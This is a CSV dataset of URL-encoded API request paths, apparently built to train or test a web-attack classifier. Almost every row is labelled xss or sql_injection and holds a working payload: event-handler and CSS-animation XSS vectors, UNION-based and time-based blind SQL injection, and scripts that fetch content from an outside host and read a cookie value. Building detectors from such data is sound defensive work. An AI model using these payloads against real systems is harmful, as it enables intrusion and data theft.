text,label
/api/v2/comments/%3Cpre+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fpre%3E,xss
/api/v2/items/0?key=API_KEY,sql_injection
/api/v1/comments?text=%3Csvg%3E%3Cpath%3E%3CanimateMotion+onbegin%3Dalert%281%29+dur%3D%221s%22+repeatCount%3D%221%22%3E,xss
/api/v2/items/admin%27%29+or+%28%271%27%3D%271%27%2F%2A?key=API_KEY,sql_injection
/api/v1/feedback?message=%3Clabel+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Flabel%3E,xss
/api/v2/search?q=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12&key=API_KEY,sql_injection
/v1/products/%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520%2523,sql_injection
/api/v2/profile?id=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Clabel+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Flabel%3E,xss
/api/v2/comments/%3Cmenuitem+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fmenuitem%3E,xss
/api/v1/reviews?body=%3Cinput+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Finput%3E,xss
/api/v1/comments?text=%3Coutput+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Foutput%3E,xss
/v1/products/ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7,sql_injection
/v1/search?q=%3Cnobr+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnobr%3E,xss
/v1/profile?bio=%3Cth+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fth%3E,xss
/api/v1/search?q=23+OR+1%3D1,sql_injection
/api/v1/comments?text=%3Cprogress+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fprogress%3E%3Cinput+autofocus%3E,xss
/api/v2/items/admin%27+--?key=API_KEY,sql_injection
/api/v2/items/%27+union+%28select+NULL%2C+NULL%2C+NULL%2C++%28select+%40%40version%29%29+--?key=API_KEY,sql_injection
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cmulticol+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fmulticol%3E,xss
/api/v1/feedback?message=%3Cu+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fu%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cplaintext+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fplaintext%3E,xss
/v1/profile?bio=%3Chtml+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fhtml%3E,xss
/api/v1/feedback?message=%3Cmeta+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmeta%3E,xss
/api/v1/comments?text=%3Caside+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Faside%3E,xss
/api/v2/profile?id=%3Cdir+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fdir%3E,xss
/api/v2/comments/%3Clink+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Flink%3E,xss
/v1/products/%27sqlattempt1,sql_injection
/api/v2/profile?id=%3Cpre+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fpre%3E,xss
/api/v2/items/UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16--?key=API_KEY,sql_injection
/api/v1/feedback?message=%3Ctr+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Ftr%3E,xss
/api/v1/feedback?message=%3Cdiv+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fdiv%3E,xss
/api/v1/login?username=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16&password=pass,sql_injection
/api/v1/login?username=or+1%3D1+or+%22%22%3D&password=pass,sql_injection
/api/v1/reviews?body=%3Csource+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fsource%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cimage+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fimage%3E,xss
/v1/profile?bio=%3Cscript%3Ed.innerHTML%2B%3D%27%27%3B%3C%2Fscript%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E,xss
/api/v1/feedback?message=%3Coptgroup+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Foptgroup%3E,xss
/api/v2/profile?id=%3Cfont+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Ffont%3E,xss
/api/v1/feedback?message=%3Cspacer+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fspacer%3E,xss
/api/v1/users?id=or+1%3D1%23,sql_injection
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Ckeygen+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fkeygen%3E,xss
/api/v1/reviews?body=%3Cframeset+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fframeset%3E,xss
/v1/search?q=%3Cmark+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmark%3E,xss
/api/v1/comments?text=%3Ctrack+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Ftrack%3E,xss
/api/v1/users?id=%27+or+user+like+%27%25,sql_injection
/api/v1/reviews?body=%3Ca+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fa%3E,xss
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cpicture+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fpicture%3E,xss
/api/v2/profile?id=%3Cnoscript+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fnoscript%3E,xss
/api/v1/reviews?body=%3Cmenuitem+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmenuitem%3E,xss
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Coutput+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Foutput%3E,xss
/api/v1/comments?text=%3Cscript%3Ex%3Ddocument.createElement%28%2522iframe%2522%29%3Bx.src%3D%2522http%3A%2F%2Fxssme.html5sec.org%2F404%2522%3Bx.onload%3Dfunction%28%29%7Bwindow.frames%5B0%5D.document.write%28%2522%3Cscript%3Er%3Dnew+XMLHttpRequest%28%29%3Br.open%28%27GET%27%2C%27http%3A%2F%2Fxssme.html5sec.org%2Fxssme2%27%2Cfalse%29%3Br.send%28null%29%3Bif%28r.status%3D%3D200%29%7Balert%28r.responseText.substr%28150%2C41%29%29%3B%7D%3C%5C%2Fscript%3E%2522%29%7D%3Bdocument.body.appendChild%28x%29%3B%3C%2Fscript%3E,xss
/v1/profile?bio=%3Cpre+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fpre%3E,xss
/api/v1/feedback?message=%3Cinput+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Finput%3E,xss
/api/v1/comments?text=%3Csummary+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fsummary%3E,xss
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cplaintext+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fplaintext%3E,xss
/api/v2/items/UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%23?key=API_KEY,sql_injection
/api/v1/search?q=1+or+benchmark%2810000000%2CMD5%281%29%29%23,sql_injection
/api/v2/profile?id=%3Coutput+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Foutput%3E,xss
/api/v1/users?id=or+SLEEP%285%29%3D%22,sql_injection
/api/v2/profile?id=%3Caddress+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Faddress%3E,xss
/v1/orders?customer_id=%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A&status=active,sql_injection
/api/v2/search?q=RANDOMBLOB%281000000000%2F2%29&key=API_KEY,sql_injection
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Ccaption+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fcaption%3E,xss
/v1/profile?bio=%3Caudio+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Faudio%3E,xss
/api/v2/comments/%3Ciframe+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fiframe%3E,xss
/v1/search?q=%3Cfont+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Ffont%3E,xss
/api/v1/feedback?message=%3Cparam+onclick%3D%22alert%281%29%22%3Etest%3C%2Fparam%3E,xss
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cshadow+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fshadow%3E,xss
/api/v1/reviews?body=%3Cnav+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnav%3E,xss
/api/v1/feedback?message=%3Cfigcaption+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ffigcaption%3E,xss
/api/v2/profile?id=%3Capplet+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fapplet%3E,xss
/api/v1/feedback?message=%3Cdt+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fdt%3E,xss
/v1/search?q=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cbr+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fbr%3E,xss
/api/v1/login?username=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5--&password=pass,sql_injection
/api/v1/orders/170279,benign
/api/v2/comments/%3Crtc+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Frtc%3E,xss
/api/v1/reviews?body=%3Cscript+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fscript%3E,xss
/v1/search?q=%3Cacronym+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Facronym%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cmain+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fmain%3E,xss
/api/v2/comments/%3Clabel+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Flabel%3E,xss
/v1/products/admin%22%29+or+%221%22%3D%221,sql_injection
/v1/search?q=%3Chtml+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fhtml%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cmarquee+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fmarquee%3E,xss
/v1/search?q=%3Ch1+onclick%3D%22alert%281%29%22%3Etest%3C%2Fh1%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Coption+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Foption%3E,xss
/v1/profile?bio=%3Csmall+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fsmall%3E,xss
/v1/profile?bio=%3Cmenuitem+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmenuitem%3E,xss
/api/v1/users?id=bfilename,sql_injection
/api/v1/reviews?body=%3Cxmp+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fxmp%3E,xss
/api/v1/comments?text=%3Col+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fol%3E%3Cinput+autofocus%3E,xss
/v1/orders?customer_id=%22%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%29%2520%2523&status=active,sql_injection
/api/v1/feedback?message=%3Cabbr+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fabbr%3E,xss
/api/v1/login?username=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%23&password=pass,sql_injection
/api/v1/feedback?message=%3Csvg%3E%3Ch1+onload%3Dalert%281%29%3E%3C%2Fh1%3E,xss
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cxmp+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fxmp%3E,xss
/api/v1/users?id=26%25,sql_injection
/api/v1/comments?text=%3Cscript%3Evar+x+%3D+document.createElement%28%27iframe%27%29%3Bdocument.body.appendChild%28x%29%3Bvar+xhr+%3D+x.contentWindow.XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C+%27http%3A%2F%2Fxssme.html5sec.org%2Fxssme2%27%2C+true%29%3Bxhr.onload+%3D+function%28%29+%7B+alert%28xhr.responseText.match%28%2Fcookie+%3D+%27%28.%2A%3F%29%27%2F%29%5B1%5D%29+%7D%3Bxhr.send%28%29%3B%3C%2Fscript%3E,xss
/api/v2/comments/%3Cp+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fp%3E,xss
/api/v2/comments/%3Cx%250Donxxx%3D1,xss
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Csection+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fsection%3E,xss
/api/v1/login?username=%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+DISTINCT%28table_name%29+FROM+%28SELECT+DISTINCT%28table_name%29%2C+ROWNUM+AS+LIMIT+FROM+sys.all_tables%29+WHERE+LIMIT%3D3%29%29+AND+%27i%27%3D%27i&password=pass,sql_injection
/api/v1/comments?text=%3Cpicture%3E%3Csource+srcset%3D%22validimage.png%22%3E%3Cimg+onload%3Dalert%281%29%3E%3C%2Fpicture%3E,xss
/api/v1/comments?text=%3Cbdo+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbdo%3E,xss
/api/v2/profile?id=%3Cnav+onclick%3D%22alert%281%29%22%3Etest%3C%2Fnav%3E,xss
/v1/products/1,sql_injection
/api/v1/comments?text=%3Cfooter+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Ffooter%3E,xss
/v1/orders?customer_id=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7&status=active,sql_injection
/api/v1/login?username=admin%22%2F%2A&password=pass,sql_injection
/v1/products/%27%3Bsleep%285000%29%3B%27,sql_injection
/api/v2/comments/%3Cmeta+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmeta%3E,xss
/v1/search?q=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Crp+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Frp%3E,xss
/v1/profile?bio=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cmeta+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fmeta%3E,xss
/api/v1/feedback?message=%3Ctime+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftime%3E,xss
/v1/profile?bio=%3Cembed+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fembed%3E,xss
/api/v2/comments/%3Ckeygen+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fkeygen%3E,xss
/api/v1/feedback?message=%3Cem+onclick%3D%22alert%281%29%22%3Etest%3C%2Fem%3E,xss
/api/v1/feedback?message=%3Ctemplate+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftemplate%3E,xss
/v1/search?q=%3Clink+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Flink%3E%3Cinput+autofocus%3E,xss
/v1/profile?bio=%3Ctable+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Ftable%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Cdialog+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fdialog%3E,xss
/v1/search?q=%3Cdiv+onclick%3D%22alert%281%29%22%3Etest%3C%2Fdiv%3E,xss
/api/v2/profile?id=%3Cfooter+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Ffooter%3E,xss
/api/v1/search?q=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%29%29--,sql_injection
/v1/profile?bio=%3Csvg%3E%3Ckeygen+onload%3Dalert%281%29%3E%3C%2Fkeygen%3E,xss
/api/v1/comments?text=%3Csource+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fsource%3E,xss
/api/v1/comments?text=%3Cprogress+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fprogress%3E%3Cinput+autofocus%3E,xss
/api/v2/comments/%3Cscript%3Ed.innerHTML%2B%3D%27%27%3B%3C%2Fscript%3E,xss
/v1/search?q=%3Ccanvas+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fcanvas%3E%3Cinput+autofocus%3E,xss
/v1/products/ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11,sql_injection
/v1/search?q=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cmenu+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fmenu%3E,xss
/v1/search?q=%3Cpicture+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fpicture%3E,xss
/v1/search?q=%3Ci+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fi%3E,xss
/api/v2/search?q=%27%29%29+or+pg_sleep%285%29--&key=API_KEY,sql_injection
/api/v2/comments/%3Cbdo+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fbdo%3E,xss
/api/v1/users/69634,benign
/api/v2/comments/%3Cx+ondblclick%3Dalert%281%29%3Edouble+click+this%21,xss
/api/v2/items/%22%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A?key=API_KEY,sql_injection
/api/v1/comments?text=%3Csvg+onclick%3D%22alert%281%29%22%3Etest%3C%2Fsvg%3E,xss
/v1/search?q=%3Cmeter+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmeter%3E,xss
/api/v2/comments/%3Cb+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fb%3E,xss
/api/v1/reviews?body=%3Cdiv+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fdiv%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Csummary+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fsummary%3E,xss
/api/v2/search?q=1+exec+sp_+%28or+exec+xp_%29&key=API_KEY,sql_injection
/api/v1/comments?text=%3Cdiv+id%3Dd%3E%3Cx+xmlns%3D%27%22%3E%3Ciframe+onload%3Dalert%282%29%2F%2F%27%3E%3C%2Fdiv%3E,xss
/v1/profile?bio=%3Cform+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fform%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cnextid+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fnextid%3E,xss
/v1/profile?bio=%3Ccenter+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fcenter%3E,xss
/api/v1/feedback?message=%3Cnav+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fnav%3E,xss
/v1/search?q=%3Cmeter+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmeter%3E,xss
/v1/profile?bio=%3Cdd+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fdd%3E,xss
/v1/search?q=%3Ckeygen+id%3Dx+onfocus%3Dalert%281%29%3E,xss
/api/v1/login?username=%27+and+0%3Dbenchmark%283000000%2CMD5%281%29%29%2520%2523&password=pass,sql_injection
/api/v1/reviews?body=%3Caudio+autoplay+controls+onseeking%3Dalert%281%29%3E%3Csource+src%3D%22validaudio.wav%22+type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E,xss
/v1/search?q=%3Cb+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fb%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cinput+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Finput%3E,xss
/api/v2/profile?id=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Csmall+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fsmall%3E,xss
/api/v1/users?id=%3Cusername%3E%27--,sql_injection
/api/v1/search?q=%22%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A,sql_injection
/api/v2/search?q=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23&key=API_KEY,sql_injection
/api/v2/profile?id=%3Cacronym+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Facronym%3E,xss
/api/v2/search?q=%27&key=API_KEY,sql_injection
/api/v1/feedback?message=%3Ca+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fa%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cbgsound+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fbgsound%3E,xss
/api/v1/comments?text=%3Ccol+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fcol%3E,xss
/api/v2/comments/%3Cscript+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fscript%3E,xss
/v1/orders?customer_id=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%2BCHAR%28112%29%29%29&status=active,sql_injection
/api/v2/search?q=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19&key=API_KEY,sql_injection
/api/v1/comments?text=%3Cspan+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fspan%3E,xss
/api/v1/comments?text=%3Ccenter+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcenter%3E,xss
/api/v2/profile?id=%3Csvg+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fsvg%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Chr+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fhr%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Csamp+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fsamp%3E,xss
/v1/profile?bio=%3C%2578+onxxx%3D1,xss
/v1/search?q=%3Cimage+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fimage%3E,xss
